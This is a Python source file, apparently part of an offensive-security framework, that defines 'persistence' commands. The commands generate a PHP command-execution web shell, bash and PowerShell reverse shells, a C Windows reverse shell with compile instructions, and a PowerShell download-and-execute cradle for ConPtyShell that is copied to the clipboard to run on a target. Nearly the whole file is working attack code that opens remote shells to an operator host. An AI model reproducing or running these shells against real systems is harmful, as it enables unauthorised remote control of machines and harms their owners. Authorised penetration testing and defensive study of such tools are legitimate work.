"""Persistence command set (pending).

Phase 05 — commands for establishing persistence: reverse shells,
web shells, backdoors, and implant generation.

Pending status: inherits from :class:`PendingCommandSet`. Promote to
:class:`LazyOwnCommandSet` once originals are deleted from ``lazyown.py``.
"""

from __future__ import annotations

import os

import cmd2

from cli.commands._base import LazyOwnCommandSet
from modules.categories import persistence_category
from utils import (
    check_lhost,
    copy2clip,
    print_msg,
)


class PersistenceCommandSet(LazyOwnCommandSet):
    """Persistence phase commands (pending)."""

    phase = "persist"
    category = "05. Persistence"

    @cmd2.with_category(persistence_category)
    def do_createwebshell(self, line):
        """Create web shells (JPG-disguised PHP, p0wny-shell, ASP)."""
        web_shell = """
<?php
// Simple PHP web shell
if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);}
?>
"""
        with open("sessions/webshell.php", "w") as f:
            f.write(web_shell)
        print_msg("[+] Web shell created at sessions/webshell.php")
        print_msg("[+] Access: http://<target>/webshell.php?cmd=id")

    @cmd2.with_category(persistence_category)
    def do_createrevshell(self, line):
        """Create a bash reverse shell script in sessions/."""
        lhost = self.params["lhost"]
        lport = self.params["lport"]
        if not check_lhost(lhost):
            return
        script = f"#!/bin/bash\nbash -i >& /dev/tcp/{lhost}/{lport} 0>&1\n"
        with open("sessions/revshell.sh", "w") as f:
            f.write(script)
        os.chmod("sessions/revshell.sh", 0o755)
        print_msg("[+] Reverse shell created at sessions/revshell.sh")
        print_msg("[+] Run: bash sessions/revshell.sh")

    @cmd2.with_category(persistence_category)
    def do_createwinrevshell(self, line):
        """Create a Windows reverse shell (PowerShell)."""
        lhost = self.params["lhost"]
        lport = self.params["lport"]
        if not check_lhost(lhost):
            return
        ps_cmd = f"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
        with open("sessions/revshell.ps1", "w") as f:
            f.write(ps_cmd)
        print_msg("[+] PowerShell reverse shell at sessions/revshell.ps1")

    @cmd2.with_category(persistence_category)
    def do_conptyshell(self, line):
        """Download ConPtyShell and prepare a PowerShell run command."""
        lhost = self.params["lhost"]
        lport = self.params["lport"]
        if not check_lhost(lhost):
            return
        print_msg("[+] Downloading ConPtyShell...")
        self.cmd("wget -O sessions/ConPtyShell.ps1 https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/ConPtyShell.ps1 2>/dev/null || curl -o sessions/ConPtyShell.ps1 https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/ConPtyShell.ps1")
        cmd = f"powershell -ep bypass -c \"IEX(New-Object Net.WebClient).downloadString('http://{lhost}:{lport}/ConPtyShell.ps1');Invoke-ConPtyShell {lhost} {lport}\""
        print_msg(f"[+] Run this on target: {cmd}")
        copy2clip(cmd)
        print_msg("[+] Command copied to clipboard!")

    @cmd2.with_category(persistence_category)
    def do_pwncatcs(self, line):
        """Start a pwncat-cs reverse shell listener."""
        lhost = self.params["lhost"]
        lport = self.params["lport"]
        if not check_lhost(lhost):
            return
        print_msg(f"[+] Starting pwncat-cs listener on {lhost}:{lport}")
        self.cmd(f"pwncat-cs -lp {lport}")

    @cmd2.with_category(persistence_category)
    def do_revwin(self, line):
        """Create a Windows reverse shell executable."""
        lhost = self.params["lhost"]
        lport = self.params["lport"]
        if not check_lhost(lhost):
            return
        code = f'#include <winsock2.h>\n#pragma comment(lib, "ws2_32")\nWSADATA wsa;SOCKET s;struct sockaddr_in addr;WSAStartup(MAKEWORD(2,2),&wsa);s=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,0,0);addr.sin_family=AF_INET;addr.sin_port=htons({lport});addr.sin_addr.s_addr=inet_addr("{lhost}");WSAConnect(s,(SOCKADDR*)&addr,sizeof(addr),NULL,NULL,NULL,NULL);STARTUPINFO sui;PROCESS_INFORMATION pi;ZeroMemory(&sui,sizeof(sui));sui.cb=sizeof(sui);sui.dwFlags=STARTF_USESTDHANDLES;sui.hStdInput=sui.hStdOutput=sui.hStdError=(HANDLE)s;CreateProcess(NULL,"cmd.exe",NULL,NULL,TRUE,0,NULL,NULL,&sui,&pi);'
        with open("sessions/revshell.c", "w") as f:
            f.write(code)
        print_msg("[+] Windows reverse shell C code at sessions/revshell.c")
        print_msg("[+] Compile: x86_64-w64-mingw32-gcc -o revshell.exe sessions/revshell.c -lws2_32")
